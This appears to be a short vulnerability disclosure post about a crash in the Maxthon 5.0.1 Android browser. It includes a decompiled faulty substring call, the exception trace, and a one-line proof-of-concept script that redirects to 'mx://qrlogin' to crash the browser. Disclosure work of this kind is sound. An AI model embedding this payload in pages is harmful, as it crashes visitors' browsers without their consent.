---
layout: post
title: Maxthon 5.0.1 (com.mx.browser.star) For Android Crash
---
Maxthon(http://www.maxthon.com/about-us/) is a state-of-the-art, multi-platform web browser that regularly outperforms other top browsers and offers users a seamless browsing and sharing experience.
 
![](https://ws4.sinaimg.cn/large/c334041bgw1f9v5ni7rt1j21aa13atii.jpg)

Decompile, com.mx.browser.web.WebViewFragment 442:

    str = str.substring("mx://qrlogin".length() + 1);

Debug:

    Caused by: java.lang.StringIndexOutOfBoundsException: length=12; index=13
    
Poc:

    <script>location.href="mx://qrlogin";</script>
    
